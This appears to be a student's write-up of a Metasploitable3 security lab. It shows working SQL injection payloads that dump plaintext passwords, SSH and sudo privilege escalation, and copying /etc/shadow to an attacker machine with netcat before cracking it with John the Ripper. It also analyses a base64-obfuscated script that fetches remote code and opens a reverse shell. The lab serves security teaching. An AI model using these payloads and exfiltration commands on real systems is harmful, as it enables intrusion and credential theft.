# Exercises
In this lab you will do the following:
* Construct and/or test out SQL injection strings to extract data from a MySQL server.
* Exploit bad local configuration & even worse policies.
* Experiment a bit with toy malware.

# SQL Injection
**Notice that ports for TCP - Hypertext Transfer Protocol (HTTP) and a MySQL Server are
open. What are the port numbers?**  
80 for the HTTP server, 3306 for the mysql server.


**Nessus does say it was unable to get version number for the MySQL server because it is restricted. Reflect on that.**  

**†Does it mean the MySQL server is protected against cyber attacks? From Kali, try `mysql -h <METASPLOITABLE IP> -P 
3306` :**  

````console
berkankutuk@kali:~$ mysql -h 10.0.2.4 -P 3306
ERROR 1130 (HY000): Host 'ubuntu' is not allowed to connect to this MySQL server
````
This makes it harder for a bad intentional hacker to find any vulnerabilities, but does not make the server filly 
protected

**†How could that protection look like?**  
Using a firewall

**†And what exactly would it protect against?**  
It protects your data by monitoring, alerting, and blocking unauthorized database activity without any changes made to the applications.

## Spying with SQL Injection
**Try accessing the web server through a browser by just entering the IP number and port number: <IP>:80 and hit enter. 
Notice the fact that we actually get a directory listing. Is this a well configured web server? Let’s go on by 
selecting "payroll_app.php"**    

**Now just press the "OK" button without any input. Notice that the page takes
the empty user name and password as correct input, even though it retrieves
nothing. Can this be good?**  
Fuck yes we're in baby!

Obviously not

**Now press the back button in the browser. Lets try the first SQL injection. Assuming that the text field’s input is 
used directly in a SQL query**  
`' OR 1=1#` seems to work

![SQL Injection](Images/SQLi.png)

![SQL Injection](Images/SQLi_result.png)

**†Please shortly discuss your opinion of this web server’s configuration
concerning directly listings.**  
Its bad and concerning since the database to the "payroll app?" is vulnerable to SQL injection. The fields are not 
sanitized

**†What type of SQLi attack works? Can you explain why?**  
Boolean-based (content-based) Blind SQLi

**Nmap and Nessus revealed that there is a database on the server on port 3306. What service is running there?**  
mysql

**Let’s go on and try to get all usernames and passwords. Enter the following command into any of the fields `' OR 
1=1 UNION SELECT null,null,username,password FROM users#` :**   

![SQL Injection](Images/SQLi-user-paswd.png)

**What do you notice about these passwords? What would you change to secure them?**  
They are in plain text. I would have used hashed and salted values to make every entry unique

**Are these passwords also used for system authentication? Lets find out. Lets try remote login using ssh from the 
terminal in Kali. Enter the following and replace "username" with any of the usernames that you found from the 
SQLinjection, and replace IP with the Metasploitable3’s IP. `ssh username@IP`** 

````console
berkankutuk@kali:~$ ssh chewbacca@10.0.2.4
The authenticity of host '10.0.2.4 (10.0.2.4)' can't be established.
ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.4' (ED25519) to the list of known hosts.
chewbacca@10.0.2.4's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

chewbacca@ubuntu:~$ 
````

**†What is the '#' sign for?**  
Used as a comment in order to terminate an SQL statement.

**†What is the issue with the passwords in the data base and what could be done to secure them?**  
They are in plain text. I would have used hashed and salted values to make every entry unique

**†Which other problem allows you to get into the machine using ssh? How could this be prevented?**  
Not a secure SSH configuration. Iptables, use of another port and stronger passwords could be some options. But best of 
them would be to completely remove the option to login with passwords, and instead use public/private keys for 
authentication.

## Elevation of Privilege
Now enter `sudo -s` to get an interactive root shell, if available. If so, the user has root access

Since chewbacca isn't in the sudoers file, we choose another user
````console
berkankutuk@kali:~$ ssh luke_skywalker@10.0.2.4
luke_skywalker@ubuntu:~$ sudo -s
root@ubuntu:~# whoami
root
````

**†Which do you see, and how would you address them?**  
Users have root access, this should be prevented by following the principle of least-privilege.

**†Can SQL Injection expose an otherwise inaccessible data base server?**  
Yes that is possible

**†How likely do you think an attack scenario as presented here is?**  
It's much lower than in the earlier days. IT security today have a few standards such as hashing the passwords of 
their users and preventing such simple attacks by using the principle of least-privilege. 

## Using our Foot in the Door for Access to Other Services
Lets find the .php file for the payroll website

````console
root@ubuntu:~# sudo find / -iname "*payroll*"
/home/kylo_ren/poc/payroll_app
/var/www/html/payroll_app.php
/var/lib/mysql-default/payroll
````

The file is in `/var/www/html/payroll_app.php`

**†Is sudo necessary? What do we gain by using it?**  
We get access to the whole system, thereby broadening our search

**†Are there other ways to search for a file? Which do you know?**  
`awk` and `grep` also works in some cases

Lets navigate to the folder
````console
root@ubuntu:~# cd /var/www/html/
root@ubuntu:~# ls
chat  drupal  payroll_app.php  phpmyadmin
````

Lets analyze the php code and see if we can find interesting lines of code

````console
root@ubuntu:~# cat payroll_app.php
````

The output
```php
<?php

$conn = new mysqli('127.0.0.1', 'root', 'sploitme', 'payroll');
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
?>

<?php
if (!isset($_POST['s'])) {
?>
<center>
<form action="" method="post">
<h2>Payroll Login</h2>
<table style="border-radius: 25px; border: 2px solid black; padding: 20px;">
    <tr>
        <td>User</td>
        <td><input type="text" name="user"></td>
    </tr>
    <tr>
        <td>Password</td>
        <td><input type="password" name="password"></td>
    </tr>
    <tr>
       <td><input type="submit" value="OK" name="s">
    </tr>
</table>
</form>
</center>
<?php
}
?>

<?php
if($_POST['s']){
    $user = $_POST['user'];
    $pass = $_POST['password'];
    $sql = "select username, first_name, last_name, salary from users where username = '$user' and password = '$pass'";

    if ($conn->multi_query($sql)) {
        do {
            /* store first result set */
            echo "<center>";
            echo "<h2>Welcome, " . $user . "</h2><br>";
            echo "<table style='border-radius: 25px; border: 2px solid black;' cellspacing=30>";
            echo "<tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr>";
            if ($result = $conn->store_result()) {
                while ($row = $result->fetch_assoc()) {
                    $keys = array_keys($row);
                    echo "<tr>";
                    foreach ($keys as $key) {
                        echo "<td>" . $row[$key] . "</td>";
                    }
                    echo "</tr>\n";
                }
                $result->free();
            }
            if (!$conn->more_results()) {
                echo "</table></center>";
            }
        } while ($conn->next_result());
    }
}
?>
```

**†Can you find anything interesting?**  
We can see the database credentials

**Whats the user name, password and database name?**  
Username: root  
Password: sploitme  
DB Name: payroll

**Accessing the database**

````console
root@ubuntu:~# mysql -h 127.0.0.1 -P 3306 -u root -p

Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

````
Quick info about the above statement: It tries to connect to the MySQL server.
* "-h" 127.0.0.1" specifies the data base server with localhost’s IP.  
* "-P" 3306" is the port number.   
* "-u root" specifies root as the username.  
* "-p" is to ensure that you are prompted for a password.

**†What was the problem with the web application?**  
The web application is using string concatenation to create a SQL statement.

**†Which ports and services were the problem associated with?**  
Service: MySQL  
Port: 3306

**†How did you exploit the vulnerability?**  
Using SQL injection

**†And what were you able to do?**  
Obtain user credentials

**†How would you suggest to fix the problem? (Do some online research about SQL injections solutions.)**  
I would sanitize the inputs in order to fix the problem.

**†Draft a shortly and crisply, the relevant parts of a policy trying to prevent these issues.** 
1. Enforcing least-privilege
2. Hashing passwords
3. Using private and public keypairs to login to an SSH instead of passwords
4. Changing the SSH port
5. Using Prepared Statements (Sanitizing user inputs before sending the SQL query)

## Fully Explore Local Accounts
Getting and cracking the shadow file

From the receiver machine
````console
berkankutuk@kali:~$ nc -lvp 1234 > shadow
listening on [any] 1234 ...
````

now to the sender machine

````console
vagrant@ubuntu:~$ cd /etc
vagrant@ubuntu:~$ sudo su
vagrant@ubuntu:~$ nc 10.0.2.15 1234 < shadow
````

Now back to the receiver machine


````console
berkankutuk@kali:~$ ls
shadow
````

(**We do the same for the passwd file under /etc/passwd from the sender machine.**)

Using john the ripper to crack the contents

````console
berkankutuk@kali:~$ unshadow passwd shadow > unshadowed.txt
berkankutuk@kali:~$ john --format=crypt unshadowed.txt
````

**†What are benefits of performing this scan after already having full access?**  
We get to fully discover the entries in the database by doing it.

**†Thinking as an attacker, what would your next steps be?**  
Create another user that has root access so i can SSH back whenever i want.

**†As an operator, what would you do to counteract?**  
Remove any unknown users and then enforce least-privilege

# Obfuscated Malware
The script is in the file called "scan.pdf" below. You can copy and paste it and
place it in scan.py file. To run it - then see the two statements above: scan.pdf
The password for the PDF is: iwillnotusethisforevil By decrypting the PDF you
formally agree that you will not use the code for evil.

Your job, as the security expert, is to analyze the script to find out if there is
anything strange within the script. Take some time to analyze the code. I.e.,
analyse it without breaking your system. :-)

**†Task 1 - Take your time to look at the code. Is it readable?**  
No, it is encrypted using base64

**Task 2 - The script is Base64 encoded charset UTF-8. You need to decode the
python script by copying the "jibberish" text that is between the quotes for the
payload variable. You can use, e.g., base64encode.net or any Base64 decoder
that you find online.**  
Decrypted using https://gchq.github.io/CyberChef/

**†Task 3 - What does the code do? Is it a malicious software and if so how would
you classify it?**  
It's a port scanner that has a reverse shell configurator built in. When ran, the script fetches another script from a website and then runs the fetched script.

After this, a reverse shell is added which gives another computer that is listening access to a shell.

Finally, the earlier fetched script is deleted and the script ends.

**Task 4 (optional) - Running the code**  
1. Decode the scan.py (already done)
2. Add two files under `/var/www/html`
   1. test.py
   2. test.txt
3. Spin up a webserver: `python -m http.server 8000`
4. From the listener machine: `nc -lvp 1234`
5. From the sender machine
   1. `chmod 744 scan.py`
   2. `python scan.py`
